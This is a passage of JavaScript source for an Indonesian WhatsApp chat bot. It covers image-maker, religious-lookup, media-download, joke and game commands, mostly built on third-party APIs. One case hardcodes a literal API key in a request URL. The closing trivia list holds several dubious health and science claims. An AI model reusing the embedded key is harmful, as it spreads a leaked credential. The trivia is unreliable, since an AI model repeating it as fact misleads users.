buffer = await getBuffer(`https://api.dapuhy.ga/api/maker/foliokiri?text=${zerr}&apikey=${dapapi}`) 
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'NIH TOD ASU'})
break
//BATAS🗿


case 'fakedonald':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.lolhuman.xyz/api/tweettrump?apikey=${zerokey}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*©Creator : WILY KUN*'})
break
case 'passed':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Bayu Sukces 99+ :)`)
txt1 = args[0]
txt2 = args[1]
buffer = await getBuffer(`https://api.lolhuman.xyz/api/gtapassed?apikey=${zerokey}&text1=${txt1}%20passed!&text2=${txt2}%20%2B99`) 
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*©Creator : YT ☕ NONTON HENTONGERS ☕*'})
break

//━━━━━━━━━━━━━━━[ ZEKS API ]━━━━━━━━━━━━━━━━━//

case 'cslogo':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
reply(mess.wait)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.zeks.me/api/cslogo?apikey=${nightapi}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'watercolor': case 'watercolour':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
reply(mess.wait)
txt1 = args[0]
txt2 = args[1]
buffer = await getBuffer(`https://api.zeks.me/api/watercolour?apikey=${nightapi}&text1=${txt1}&text2=${txt2}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'freefire2':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Hentongers :v :)`)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.zeks.me/api/epep?apikey=${nightapi}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol})
break
case 'tfire':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Hentongers :v :)`)
reply(mess.wait)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.zeks.me/api/tfire?apikey=${nightapi}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'lightsok':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Hentongers :v :)`) 
reply(mess.wait)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.zeks.me/api/tlight?apikey=${nightapi}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'goldplaybutton':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Dylan Pros`) 
reply(mess.wait)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.zeks.me/api/gplaybutton?apikey=${nightapi}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*Maff Kalo Jelek 😅*'})
break
case 'silverplaybutton':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Dylan Pros`) 
reply(mess.wait)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.zeks.me/api/splaybutton?apikey=${nightapi}&text=${zerr}`)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*Maff Kalo Jelek 😅*'})
break
//━━━━━━━━━━━━━━━[ BATAS ZEKS API ]━━━━━━━━━━━━━━━━━//
case 'coolgravity':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Hentongers :v :)`) 
reply(mess.wait)
txt1 = args[0]
txt2 = args[1]
buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/coolgravity?apikey=${zerokey}&text1=${txt1}&text2=${txt2}`)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*Nih Bor*'})
break
case 'grafityname':
if (args.length == 0) return reply(`Teksnya mana oii 🤣\nContoh : ${prefix + command} Hentongers :v :)`) 
reply(mess.wait)
zerr = args.join(" ")
buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome/wonderfulgraffiti?apikey=${zerokey}&text=${zerr}`) 
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'greenneon':
case 'advanceglow':
case 'futureneon':
case 'sandwriting':
case 'sandsummer':
case 'sandengraved':
case 'metaldark':
case 'neonlight':
case 'holographic':
case 'minion':
case 'deluxesilver':
case 'newyearcard':
case 'bloodfrosted':
case 'halloween':
case 'jokerlogo':
case 'fireworksparkle':
case 'natureleaves':
case 'bokeh':
case 'toxic':
case 'strawberry':
case 'box3d':
case 'roadwarning':
case 'breakwall':
case 'icecold':
case 'luxury':
case 'cloud':
case 'summersand':
case 'horrorblood':
case 'thunder':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
zerr = args.join(" ")
getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${zerokey}&text=${zerr}`).then((gambar) => {
zeroyt7.sendMessage(from, gambar, image, { quoted: ftrol, caption: '*©Creator : YT ☕ NONTON HENTONGERS ☕*' })
})
break

//━━━━━━━━━━━━━━━[ FITUR ISLAMI ]━━━━━━━━━━━━━━━━━//

case 'listsurah':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${zerokey}`)
get_result = get_result.result
zerr = '*List Surah :*\n'
for (var x in get_result) {
zerr += `${x}. ${get_result[x]}\n`
}
reply(zerr)
break
case 'asmaulhusna':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Urutan :* ${get_result.index}\n`
zerr += `*Latin :* ${get_result.latin}\n`
zerr += `*Arab :* ${get_result.ar}\n`
zerr += `*Indonesia :* ${get_result.id}\n`
zerr += `*English :* ${get_result.en}`
reply(zerr)
break
case 'jadwalsholat':
if (args.length == 0) return reply(`Nama Kotanya Mana ?\nContoh : ${prefix + command} Temanggung`)
daerah = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Wilayah :* ${get_result.wilayah}\n`
zerr += `*Tanggal :* ${get_result.tanggal}\n`
zerr += `*Sahur :* ${get_result.sahur}\n`
zerr += `*Imsak :* ${get_result.imsak}\n`
zerr += `*Subuh :* ${get_result.subuh}\n`
zerr += `*Terbit :* ${get_result.terbit}\n`
zerr += `*Dhuha :* ${get_result.dhuha}\n`
zerr += `*Dzuhur :* ${get_result.dzuhur}\n`
zerr += `*Ashar :* ${get_result.ashar}\n`
zerr += `*Maghrib :* ${get_result.maghrib}\n`
zerr += `*Isya :* ${get_result.isya}`
reply(zerr)
break
case 'kisahnabi':
if (args.length == 0) return reply(`Example : ${prefix + command} Muhammad`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Nama :* ${get_result.name}\n`
zerr += `*Lahir :* ${get_result.thn_kelahiran}\n`
zerr += `*Umur :* ${get_result.age}\n`
zerr += `*Tempat :* ${get_result.place}\n`
zerr += `*Story :* ${get_result.story}`
reply(zerr)
break
case 'alquran':
if (args.length < 1) return reply(`Nomer Surah Nya Mana ?\nContoh : ${prefix + command} 18\nAtau ${prefix + command} 18/10\nAtau ${prefix + command} 18/1-10`)
urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${zerokey}`
quran = await fetchJson(urls)
result = quran.result
ayat = result.ayat
zerr = `QS. ${result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
arab = x.arab
nomor = x.ayat
latin = x.latin
indo = x.indonesia
zerr += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
}
zerr = zerr.replace(/<u>/g, "").replace(/<\/u>/g, "")
zerr = zerr.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
zerr = zerr.replace(/<u>/g, "").replace(/<\/u>/g, "")
reply(zerr)
break
case 'alquranaudio':
if (args.length == 0) return reply(`Nomer Surah Nya Mana ?\nContoh : ${prefix + command} 18\nAtau ${prefix + command} 18/10`)
surah = args[0]
buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${zerokey}`)
await zeroyt7.sendMessage(from, buffer, audio, { quoted: fmen, mimetype: Mimetype.mp4Audio })
break

//━━━━━━━━━━━━━━━[ FITUR DOWNLOAD ]━━━━━━━━━━━━━━━━━//

case 'tiktokmusic':
if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
link = args[0]
get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${zerokey}&url=${link}`)
zeroyt7.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: ftrol})
break
case 'igdl':
if (args.length == 0) return reply(`Link Nya Mana Tod ?\nContoh : ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
url = args[0]
url = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=${zerokey}&url=${url}`)
url = url.result
type = image
if (url.includes(".mp4")) type = video
buffer = await getBuffer(url)
zeroyt7.sendMessage(from, buffer, type, { quoted: ftrol})
break
case 'fbdl':
if (args.length == 0) return reply(`Link Nya Mana Tod ?\nContoh : ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
url = args[0]
url = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${zerokey}&url=${url}`)
url = url.result[0].link
buffer = await getBuffer(url)
zeroyt7.sendMessage(from, buffer, video, { quoted: ftrol})
break
case 'brainly':
if (args.length == 0) return reply(`Apa Yang Mau Di Cari Tod ?\nContoh : ${prefix + command} Soekarno adalah`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
zerr = "Result Search : \n"
for (var x of get_result) {
zerr += `${x.title}\n`
zerr += `${x.url}\n\n`
}
reply(zerr)
break
case 'lirik':
if (args.length == 0) return reply(`Judul Lagu Nya Mana Tod ?\nContoh : ${prefix + command} Melukis Senja`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=${zerokey}&query=${query}`)
reply(get_result.result)
break
case 'tiktoknowm':
if (args.length == 0) return reply(`Link Nya Mana Tod ?\nContoh : ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
url = args[0]
url = `https://api.lolhuman.xyz/api/tiktok?apikey=${zerokey}&url=${url}`
get_result = await fetchJson(url)
buffer = await getBuffer(get_result.result.link)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol})
break
case 'pinterest':
if (args.length == 0) return reply(`Example: ${prefix + command} Waifu`)
query = args.join(" ")
url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${zerokey}&query=${query}`)
url = url.result
buffer = await getBuffer(url)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol})
break
case 'spotifysearch':
if (args.length == 0) return reply(`Judul Lagu Nya Mana Tod ?\nContoh : ${prefix + command} Melukis Senja`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotifysearch?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
zerr = ""
for (var x of get_result) {
zerr += `*Title :* ${x.title}\n`
zerr += `*Artists :* ${x.artists}\n`
zerr += `*Duration :* ${x.duration}\n`
zerr += `*Link :* ${x.link}\n`
zerr += `*Preview :* ${x.preview_url}\n\n\n`
}
reply(zerr)
break
case 'play':
if (args.length == 0) return await reply(`Judul Lagunya Mana Tod\nContoh : ${prefix + command} melukis senja`)
image = fs.readFileSync('./zeroyt7/zero.jpg')
teks =
`Silahkan Pilih Tipe File Yg Mau Di Download`
but = [
{ buttonId: `${prefix}playmp3 ${q}`, buttonText: { displayText: '🎵 MUSIC 🎵' }, type: 1 },
{ buttonId: `${prefix}playmp4 ${q}`, buttonText: { displayText: ' 🎥 VIDEO 🎥' }, type: 1 }
]
sendButLocation(from, teks, faketeks, image, but)
break
case 'playmp3':
if (args.length == 0) return await reply(`Judul Lagunya Mana Tod\nContoh : ${prefix + command} melukis senja`)
reply(mess.wait)
await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${zerokey}&query=${args.join(" ")}`)
.then(async(result) => {
await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${zerokey}&url=https://www.youtube.com/watch?v=${result.result[0].videoId}`)
.then(async(result) => {
result = result.result
caption = `❖ Title    : *${result.title}*\n`
caption += `❖ Size     : *${result.size}*`
ini_buffer = await getBuffer(result.thumbnail)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: caption })
get_audio = await getBuffer(result.link)
await zeroyt7.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${result.title}.mp3`, quoted: ftrol})
})
})
break
case "playmp4":
if (args.length === 0)
return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
reply(mess.wait)
var srch = args.join("")
aramas = await yts(srch)
aramat = aramas.all;
var mulaikah = aramat[0].url;
try {
ytv(mulaikah).then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res;
axios
.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000)
return sendMediaURL(from,thumb,`*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => reply("error"))
})
})
} catch (err) {
reply(mess.error.api)
}
break
case 'ytsearch':
if (args.length == 0) return reply(`Judul Video Yg Mau Di Cari Tod\nContoh : ${prefix + command} Melukis Senja`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Views : ${x.views}\n`
ini_txt += `Published : ${x.published}\n`
ini_txt += `Thumbnail : ${x.thumbnail}\n`
ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
}
reply(ini_txt)
break
case 'ytmp4':
if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
ini_link = args[0]
get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo2?apikey=${zerokey}&url=${ini_link}`)
get_result = get_result.result
ini_txt = `${get_result.title} - ${get_result.size}`
ini_buffer = await getBuffer(get_result.thumbnail)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: ini_txt })
get_audio = await getBuffer(get_result.link)
await zeroyt7.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break
                    case 'ytmp3':
                    if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytaudio2?apikey=${zerokey}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_txt = `${get_result.title} - ${get_result.size}`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    zeroyt7.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
                    break
                 

//━━━━━━━━━━━━━━━[ FITUR GABUT ]━━━━━━━━━━━━━━━━━//

case 'meme':
await getBuffer(`https://api.lolhuman.xyz/api/random/meme?apikey=${zerokey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
})
break
case 'darkjoke':
await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${zerokey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
})
break
case 'memeindo':
await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=${zerokey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
})
break
case 'quotes':
quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${zerokey}`)
quotes = quotes.result
author = quotes.by
quotes = quotes.quote
reply(`_${quotes}_\n\n*― ${author}*`)
break
case 'quotesanime':
quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${zerokey}`)
quotes = quotes.result
quote = quotes.quote
char = quotes.character
anime = quotes.anime
episode = quotes.episode
reply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
break
case 'quotesdilan':
quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${zerokey}`)
reply(quotedilan.result)
break
case 'quotesimage':
get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${zerokey}`)
await zeroyt7.sendMessage(from, get_result, image, { quotes: ftrol })
break
case 'katabijak':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${zerokey}`)
reply(get_result.result)
break
case 'randomnama':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${zerokey}`)
reply(anu.result)
break
case 'dadu':
random = Math.floor(Math.random() * 6) + 1
damdu = fs.readFileSync(`./sticker/${random}.webp`)
zeroyt7.sendMessage(from, damdu, sticker, {quoted: ftrol})
break
case 'tembak':
                    if (args[0] == 'udara') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh33}* ]`)
                    }, 12000)
                    }
                    if (args[0] == 'darat') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh22}* ]`)
                    }, 12000)
                    }
                    if (args[0] == 'laut') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh11}* ]`)
                    }, 12000)
                    }
                    break
                    case 'family100':
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/family100?apikey=2ff99ddfb35e897494de4ee6`, {method: 'get'})
					family = `*${anu.result.question}*`
					setTimeout( () => {
					zeroyt7.sendMessage(from, '*➸ Jawaban :* '+anu.result.aswer, text, {quoted: ftrol}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					zeroyt7.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					zeroyt7.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					zeroyt7.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					zeroyt7.sendMessage(from, family, text, {quoted: ftrol}) // ur cods
					}, 0) // 1000 = 1s,
					break
                  
					case 'slot':
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            const somtoy2 = sotoy1[Math.floor(Math.random() * sotoy1.length)]
            const somtoy3 = sotoy2[Math.floor(Math.random() * sotoy2.length)]
            const somtoy4 = sotoy3[Math.floor(Math.random() * sotoy3.length)]
            zeroyt7.sendMessage(from, `
[ SLOTS ]\n-----------------
${somtoy2}
${somtoy}<=====
${somtoy3}
[ SLOTS ]
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`, text, { quoted: ftrol })
            break
case 'suit':
if (args.length < 1) return reply('Pilih gunting/batu/kertas')
			if (args[0] === 'gunting' ) {
			gunting = [
	        "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 🗿",
		    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 😱",
	        "Kamu *Gunting*\nAku *Gunting*\nKita Seri 🗿"
		    ]
		    gun = gunting[Math.floor(Math.random() * gunting.length)]
		    reply(gun)
			} else if (args[0] === 'kertas') {
		    ker = [
		    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 🗿",
		    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 😱",
		    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 🗿"
		    ]
		    kertas = ker[Math.floor(Math.random() * ker.length)]
			reply(kertas)
			} else if (args[0] === 'batu') {
		   bat = [
		   "Kamu *Batu*\nAku *Gunting*\nKamu Menang 🗿",
		   "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 😱",
		   "Kamu *Batu*\nAku *Batu*\nKita Seri 🗿"
	       ]
		   batu = bat[Math.floor(Math.random() * bat.length)]
		   reply(batu)
		   } else {
		   reply('Pilih gunting/batu/kertas')
		   }
           break
case 'artinama':
if (args.length == 0) return reply(`Nama Nya Mana Tod ?\nContoh : ${prefix + command} zByy`)
nama = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/artinama?apikey=${zerokey}&nama=${nama}`)
reply(get_result.result)
break
case 'jodoh':
if (args.length == 0) return reply(`Namanya Mana Tod ?\nContoh : ${prefix + command} Aku & Dia`)
nama = args.join(" ").split("&")
nama1 = nama[0].trim()
nama2 = nama[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Positif :* ${get_result.positif}\n\n`
zerr += `*Negative :* ${get_result.negatif}\n\n`
zerr += `*Deskripsi :* ${get_result.deskripsi}`
reply(zerr)
break
case 'tebakumur':
if (args.length == 0) return reply(`Nama Nya Mana Tod ?\nContoh : ${prefix + command} Bayu`)
name = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakumur?apikey=${zerokey}&name=${name}`)
get_result = get_result.result
zerr = `*Nama :* ${get_result.name}\n`
zerr += `*Umur :* ${get_result.age}`
reply(zerr)
break
case 'weton':
if (args.length == 0) return reply(`Tanggal Nya Mana Tod ?\nContoh : ${prefix + command} 12 12 2020`)
tanggal = args[0]
bulan = args[1]
tahun = args[2]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/weton/${tanggal}/${bulan}/${tahun}?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Weton :* ${get_result.weton}\n\n`
zerr += `*Pekerjaan :* ${get_result.pekerjaan}\n\n`
zerr += `*Rejeki :* ${get_result.rejeki}\n\n`
zerr += `*Jodoh :* ${get_result.jodoh}`
reply(zerr)
break
case 'jadian':
if (args.length == 0) return reply(`Tanggal Nya Mana Tod ?\nContoh : ${prefix + command} 12 12 2020`)
tanggal = args[0]
bulan = args[1]
tahun = args[2]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Karakteristik :* ${get_result.karakteristik}\n\n`
zerr += `*Deskripsi :* ${get_result.deskripsi}`
reply(zerr)
break
case 'faktaunik':{
const faktau = ["Negara Indonesia berada di posisi ke-4 sebagai Negara Terindah di Dunia versi situs First Choice.","Di Italia, dalam aturannya minuman Cappuccino hanya boleh di minum sebelum waktu siang.","AS, Australia, Finlandia, Jerman dan Kanada adl negara maju tanpa UN. Tahukah anda sekolah trbaik di dunia ada di Finlandia walau tanpa UN.","","\"Jengkol is very nice\" komentar Pierre Bouvier vokalis Simple Plan.","Tiap satu kali jari kita mengklik mouse komputer, ada 1,42 kalori yang terbakar dalam tubuh. (Penelitian, Convert Anything to Calories).","Di Jepang kuno, prajurit diolesi minyak kodok pada tubuh mereka dengan keyakinan bahwa hal itu akan membuat tubuh mereka antirobek."," Di Jepang, ketiduran saat bekerja (inemuri) dapat ditolerir, karena dipandang sebagai kelelahan yang muncul akibat bekerja terlalu keras.","Gergaji mekanik awalnya diciptakan sebagai alat kedokteran untuk membantu melahirkan bayi.","Jangan sering mengatakan kata  di Australia dan Selandia Baru. Di sana, kata berarti mengajak untuk melakukan hubungan seks.","Jamur merang Laetiporus dikenal sebagai julukan \"ayam hutan\" karena konon rasanya mirip seperti daging ayam goreng.","Kaki katak merupakan hidangan istimewa di eropa. Tahukah Anda: sekitar 80% impor katak Eropa berasal dari Indonesia.","Jika Anda mengetik \"do the harlem shake\" di search bar YouTube, layar akan melakukan Harlem Shake!. [Google Chrome]","Melihat melalui lubang kecil akan segera meningkatkan penglihatan Anda sementara.","YouTube menyebutkan rata-rata ada 4000 video baru Harlem Shake yang diunggah setiap hari. [Yahoo!]","Semut memiliki kuburan sendiri. Tapi tahukah anda: Gurita memiliki kebun dan suka berkebun. (wikipedia)","Coklat mengandung Theobromine, molekul organik yang dapat membantu menguatkan enamel gigi. (Penelitian dari Tulane University).","Wanita 2 kali lebih banyak menggunakan emoticon dalam pesan teks dibandingkan pria. (Penelitian di Rice University)","Biarpun Buzz Aldrin adalah orang kedua yang menginjak di bulan tetapi ia adalah orang pertama yang membuang kotoran di ruang angkasa.","Fakta unik berikutnya adalah, Psikolog mengatakan bahwa mengirim dan menerima pesan teks benar-benar dapat meningkatkan mood Anda ketika Anda merasa kesepian. (Telegraph)","Thailand merupakan satu-satunya negara di Asia Tenggara yang tidak pernah dijajah.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. (cracked .com)"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. (BBCnews)","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Semakin pahit cokelat (tinggi zat theobromine), semakin tinggi manfaatnya. Rajin mengkonsumsi 1bar cokelat/hari dapat menyembuhkan batuk kronis.","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".","Tidur Siang (Power Nap) trbukti menambah tinggi badan, dikrnkan saat kita tidur siang hormon pertumbuhan (Growth Hormone) lbh aktif bekerja.","Bilangan prima terbesar di dunia saat ini panjangnya 17 juta digit angka, cukup banyak untuk mengisi 28 lembar halaman pada buku novel.","Menurut sebuah studi, minum teh hijau setelah makan ikan membantu menghalangi zat Mercury yang terkandung dalam ikan memasuki aliran darah."," Memperpanjang usia handphone hingga 4 tahun dapat mengurangi dampak lingkungan sampai 40 persen. [Hasil studi di Swiss]","Duduk bersama dgn teman-teman / keluarga utk makan bersama, dpt meningkatkan kebahagiaan & membantu meringankan depresi. [ehealthnewsdaily]","Abibliophobia adalah fobia atau ketakutan terhadap kehabisan bahan bacaan.","Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai \"emas putih\".","Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]","Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]","","35. Disarankan supaya membeli sepatu pada sore hari. Sebab, setelah seharian berjalan, di sore hari kaki akan membesar 5-8 persen.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]","Menurut penelitian baru, usia harapan hidup anak band rata-rata lebih tinggi dibandingkan musisi yang memilih solo karir. (detikHealth)","Pulau Dewata Bali merupakan 1 dari 10 pulau paling romantis di dunia. [majalah Travel+Leisure]","Universitas di Jepang selalu melakukan upacara 